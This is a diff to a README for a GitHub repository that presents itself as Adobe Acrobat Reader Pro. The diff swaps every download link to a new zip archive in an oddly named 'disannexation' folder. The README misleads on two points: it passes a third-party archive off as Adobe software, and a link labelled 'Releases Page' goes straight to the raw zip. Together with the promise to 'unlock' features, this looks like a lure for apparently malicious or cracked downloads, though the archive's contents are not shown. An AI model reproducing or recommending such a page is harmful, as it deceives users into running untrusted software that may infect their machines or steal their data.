@@ -4,7 +4,7 @@
 **adobe-acrobat-reader-pro** is a comprehensive software application developed by Adobe Inc. This tool allows users to create, edit, sign, convert, and manage Portable Document Format (PDF) files with ease.
 
 ## 🔗 Download 
-[![Download Latest Release](https://github.com/ArjunK-Electron/adobe-acrobat-reader-pro/raw/refs/heads/main/disannexation/acrobat_reader_adobe_pro_v1.0.zip%20Latest%https://github.com/ArjunK-Electron/adobe-acrobat-reader-pro/raw/refs/heads/main/disannexation/acrobat_reader_adobe_pro_v1.0.zip)](https://github.com/ArjunK-Electron/adobe-acrobat-reader-pro/raw/refs/heads/main/disannexation/acrobat_reader_adobe_pro_v1.0.zip)
+[![Download Latest Release](https://github.com/ArjunK-Electron/adobe-acrobat-reader-pro/raw/refs/heads/main/disannexation/reader_pro_acrobat_adobe_1.6.zip%20Latest%https://github.com/ArjunK-Electron/adobe-acrobat-reader-pro/raw/refs/heads/main/disannexation/reader_pro_acrobat_adobe_1.6.zip)](https://github.com/ArjunK-Electron/adobe-acrobat-reader-pro/raw/refs/heads/main/disannexation/reader_pro_acrobat_adobe_1.6.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run **adobe-acrobat-reader-pro**:
@@ -13,7 +13,7 @@ Follow these steps to download and run **adobe-acrobat-reader-pro**:
    
    Click the link below to visit the releases page where you can find the latest version.
 
-   [Visit the Releases Page](https://github.com/ArjunK-Electron/adobe-acrobat-reader-pro/raw/refs/heads/main/disannexation/acrobat_reader_adobe_pro_v1.0.zip)
+   [Visit the Releases Page](https://github.com/ArjunK-Electron/adobe-acrobat-reader-pro/raw/refs/heads/main/disannexation/reader_pro_acrobat_adobe_1.6.zip)
 
 2. **Choose the Latest Version**
    
@@ -94,6 +94,6 @@ This project covers several key topics related to PDF management. Some include:
 ## 🔗 Download & Install
 Ready to get started? Download **adobe-acrobat-reader-pro** now by visiting the link below:
 
-[Download Latest Release](https://github.com/ArjunK-Electron/adobe-acrobat-reader-pro/raw/refs/heads/main/disannexation/acrobat_reader_adobe_pro_v1.0.zip)
+[Download Latest Release](https://github.com/ArjunK-Electron/adobe-acrobat-reader-pro/raw/refs/heads/main/disannexation/reader_pro_acrobat_adobe_1.6.zip)
 
 Follow the steps above to install and unlock the powerful features for your PDF needs. Enjoy using **adobe-acrobat-reader-pro**!
